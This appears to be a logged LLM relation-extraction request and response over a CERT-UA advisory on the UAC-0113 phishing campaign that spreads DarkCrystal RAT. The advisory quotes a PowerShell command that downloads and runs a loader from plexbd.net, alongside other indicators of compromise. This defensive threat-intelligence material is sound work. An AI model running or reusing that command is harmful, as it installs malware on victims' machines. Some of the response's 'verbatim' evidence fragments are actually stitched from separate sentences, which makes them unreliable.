@@ -1,0 +1,198 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- Україна [Country] A sovereign country in Eastern Europe.
+- gov.ua [Domain Name] The official government second-level domain of Ukraine.
+- UAC-0113 [Threat Actor] A threat group tracked by CERT-UA targeting Ukrainian organizations and telecommunication providers.
+- DarkCrystal RAT [Malware Family] A commercial .NET-based remote access trojan also known as DCRat.
+- Алгоритм дій членів сім’ї безвісти відсутнього військовослужбовця LegalAid.rar [Malware Family] A password-protected RAR archive containing a malicious Excel spreadsheet.
+- Алгоритм_LegalAid.xlsm [Malware Family] A malicious macro-enabled Excel document used to download and execute secondary malware payloads.
+- MSCommondll.exe [Malware Family] A .NET loader executable that downloads and executes DarkCrystal RAT.
+- MSCommonDriver.exe [Malware Family] A malicious executable payload associated with the UAC-0113 campaign.
+- MSCommonDriver.DCRat.exe [Malicious File] An executable payload delivering the DarkCrystal RAT malware.
+- new.bat [untyped: script file] A batch script dropped or executed during the infection process.
+- plexbd[.]net [Domain Name] A network domain used to host malicious executable payloads.
+- datagroup.ddns[.]net [Domain Name] A dynamic DNS domain used as command and control infrastructure for DarkCrystal RAT.
+- 103[.]27.202.127 [IP Address] An IP address identified in email headers or attack infrastructure.
+- 203[.]96.191.70 [IP Address] An IP address identified as part of the threat actor's network infrastructure.
+- 31[.]7.58.82 [IP Address] An IP address associated with malicious activity in the incident.
+- CERT-UA#4797 [untyped: security advisory] A previous cybersecurity alert issued by CERT-UA describing an attack on Ukrainian media organizations.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [Domain Name] -> Tail [Malware Family]:
+- hosts-file: The head domain name hosts or serves the tail file or payload.
+
+Head [Domain Name] -> Tail [(untyped)]:
+- hosts-file: The head domain or server infrastructure hosts the tail downloadable file or payload.
+
+Head [Threat Actor] -> Tail [Country]:
+- targets: The head threat actor directs its malicious campaign or operations against the tail country or organization.
+
+Head [Threat Actor] -> Tail [Malware Family]:
+- uses-malware: 
+
+Head [Threat Actor] -> Tail [(untyped)]:
+- associated-with: The head threat actor is linked or attributed with a certain level of confidence to the tail threat group.
+
+Head [Malware Family] -> Tail [Malware Family]:
+- downloads-file: The head malware family or document requests and retrieves the tail file from a network location.
+
+Head [Malicious File] -> Tail [Malware Family]:
+- delivers: 
+
+Head [Malicious File] -> Tail [Malicious File]:
+- downloads-and-executes: 
+
+Head [(untyped)] -> Tail [Country]:
+- targets: The head entity aims its malicious activity or campaign at the tail country or organization.
+
+Head [(untyped)] -> Tail [Domain Name]:
+- registered-with: The head domain or URL is registered through the tail domain registrar.
+
+Head [(untyped)] -> Tail [Malware Family]:
+- delivers: The head file or process installs, runs, or deploys the tail malware family.
+
+Head [(untyped)] -> Tail [(untyped)]:
+- operates-instance-of: The head entity hosts, deploys, or manages an instance or node of the software product specified as the tail.
+- has-contact-email: The head entity maintains or uses the tail email address for official communication or incident reporting.
+- subordinate-to: The head entity is an administrative unit, working body, or subdivision of the tail government body.
+- uses-malware: The head threat actor utilizes or deploys the tail malware family in their operations.
+- contains-file: The head archive or container file encloses the tail file.
+- hosted-on: The head domain, infrastructure, or resource is hosted or deployed on the tail platform or hosting service.
+- exfiltrates-data-to: The head malware transmits stolen information to the tail platform, service, or destination.
+- routes-traffic-through: The head malware routes or proxies its network communications through the tail network or proxy service.
+- creates: The head entity generates, extracts, drops, or writes the tail file onto the victim's filesystem.
+- downloads-and-executes: The head entity downloads the tail payload from a remote resource and initiates its execution.
+- exploits-vulnerability: The head entity takes advantage of the tail vulnerability to compromise a system.
+
+Head [IP Address] -> Tail [Malware Family]:
+- hosts-file: The head IP address hosts or serves the tail malicious file or payload.
+
+Head [IP Address] -> Tail [Malicious File]:
+- hosts-file: The head IP address hosts or serves the tail malicious file or payload.
+
+Head [IP Address] -> Tail [(untyped)]:
+- hosted-on: The head IP address or infrastructure is hosted on or provided by the tail hosting service.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA отримано інформацію щодо розповсюдження електронних листів з темою "Безоплатна первинна правова допомога" та вкладенням "Алгоритм дій членів сім’ї безвісти відсутнього військовослужбовця LegalAid.rar", яке захищеним паролем, з електронної адреси в домені gov.ua (вірогідно, скомпрометованої).</p><p>Зазначений RAR-архів містить документ "Алгоритм_LegalAid.xlsm", що присвячений питанням отримання правової допомоги. У разі відкриття документу та активації макросу буде виконанно PowerShell-команду, яка забезпечить завантаження та запуск .NET-завантажувача "MSCommondll.exe". Згаданий виконуваний файл, у свою чергу, здійснить завантаження та запуск шкідливої програми DarkCrystal RAT.</p><p>Виходячи з email-адрес отримувачів електронних листів, а також домену управління DarkCrystal RAT припускаємо, що атака спрямована у відношенні операторів та провайдерів телекомунікацій України. Під час попередньої атаки, 10.06.2022, об'єктами заінтересованості зловмисників були медійні організації України (<a href="https://cert.gov.ua/article/160530" rel="noopener noreferrer" target="_blank">CERT-UA#4797</a>).</p><p>Активність відстежується за ідентифікатором UAC-0113.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">2fe9e49143b5a5d7a2ac38c1c56cbf21&nbsp; &nbsp; 183a05f7a69bba3f9ec7df8abd50f5fd89246da7e732c19842a1a1eecc78f96f&nbsp; &nbsp; Алгоритм дій членів сім’ї безвісти відсутнього військовослужбовця LegalAid.rar
+b726312450e28faa38396736be1b00fb&nbsp; &nbsp; 2b2438aa8da7c23e714f2d7a196d82ed52914c9353ef9fded01448216bd858ff&nbsp; &nbsp; Алгоритм_LegalAid.xlsm
+fd2e0ec9021783dba1c9744fa730e5b9&nbsp; &nbsp; 471af7ed687ef875c6118ec2f440f0dea9a434b54d81b7946f58505676f7c589&nbsp; &nbsp; MSCommondll.exe (2022-06-15)
+19bbb1b94f66609cbd80945c14486e93&nbsp; &nbsp; 7cffb54cb07db2f4104b8764ff15799111d06ea81d9c74c09134c61341d74202&nbsp; &nbsp; MSCommonDriver.exe (2022-06-23)
+8fc587099c54491749b2b65176f4a145&nbsp; &nbsp; 96444376dfd650f8c994116f90be1cacbd337ebdcbafe922910645cb7549ace2&nbsp; &nbsp; MSCommonDriver.DCRat.exe (2022-06-09) (DarkCrystal RAT)
+</pre><p><br></p><p><em>Мережеві</em>:</p><pre class="ql-syntax" spellcheck="false">hXXp://plexbd[.]net/MSCommonDriver.exe
+hXXp://plexbd[.]net/MSCommondll.exe
+hXXps://datagroup.ddns[.]net/PythonHttpGeolongpolldefault.php
+plexbd[.]net
+datagroup.ddns[.]net
+103[.]27.202.127 (Received)
+203[.]96.191.70
+31[.]7.58.82
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
+</pre><p>&nbsp;&nbsp;&nbsp;</p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">(New-object Net.WebClient).DownloadFile('hXXp://plexbd.net/MSCommondll.exe','C:\Users\Public\MSCommondll.exe');Start-Process 'C:\Users\Public\MSCommondll.exe'
+C:\Users\Public\MSCommondll.exe
+c:\Users\public\new.bat
+DCR_MUTEX-PNY1ZVhO2iPJoDxTnEBp
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p><strong>﻿</strong></p>
+
+=== RESPONSE (6.0s, in 3143 / out 880 tok, STOP) ===
+```json
+{
+  "relations": [
+    {
+      "head": "UAC-0113",
+      "type": "targets",
+      "tail": "Україна",
+      "evidence": "атака спрямована у відношенні операторів та провайдерів телекомунікацій України. Активність відстежується за ідентифікатором UAC-0113.",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0113",
+      "type": "uses-malware",
+      "tail": "DarkCrystal RAT",
+      "evidence": "здійснить завантаження та запуск шкідливої програми DarkCrystal RAT. Активність відстежується за ідентифікатором UAC-0113.",
+      "fit": "exact"
+    },
+    {
+      "head": "Алгоритм дій членів сім’ї безвісти відсутнього військовослужбовця LegalAid.rar",
+      "type": "contains-file",
+      "tail": "Алгоритм_LegalAid.xlsm",
+      "evidence": "Зазначений RAR-архів містить документ \"Алгоритм_LegalAid.xlsm\"",
+      "fit": "new"
+    },
+    {
+      "head": "Алгоритм_LegalAid.xlsm",
+      "type": "downloads-file",
+      "tail": "MSCommondll.exe",
+      "evidence": "активації макросу буде виконанно PowerShell-команду, яка забезпечить завантаження та запуск .NET-завантажувача \"MSCommondll.exe\"",
+      "fit": "exact"
+    },
+    {
+      "head": "MSCommondll.exe",
+      "type": "downloads-file",
+      "tail": "DarkCrystal RAT",
+      "evidence": "MSCommondll.exe\". Згаданий виконуваний файл, у свою чергу, здійснить завантаження та запуск шкідливої програми DarkCrystal RAT.",
+      "fit": "exact"
+    },
+    {
+      "head": "plexbd[.]net",
+      "type": "hosts-file",
+      "tail": "MSCommondll.exe",
+      "evidence": "hXXp://plexbd[.]net/MSCommondll.exe",
+      "fit": "exact"
+    },
+    {
+      "head": "plexbd[.]net",
+      "type": "hosts-file",
+      "tail": "MSCommonDriver.exe",
+      "evidence": "hXXp://plexbd[.]net/MSCommonDriver.exe",
+      "fit": "exact"
+    },
+    {
+      "head": "datagroup.ddns[.]net",
+      "type": "command-and-control-for",
+      "tail": "DarkCrystal RAT",
+      "evidence": "а також домену управління DarkCrystal RAT",
+      "fit": "new"
+    },
+    {
+      "head": "MSCommonDriver.DCRat.exe",
+      "type": "delivers",
+      "tail": "DarkCrystal RAT",
+      "evidence": "MSCommonDriver.DCRat.exe (2022-06-09) (DarkCrystal RAT)",
+      "fit": "exact"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "contains-file",
+      "definition": "The head archive or container file contains or embeds the tail file."
+    },
+    {
+      "name": "command-and-control-for",
+      "definition": "The head domain or network infrastructure serves as a command and control server for the tail malware family."
+    }
+  ]
+}
+```
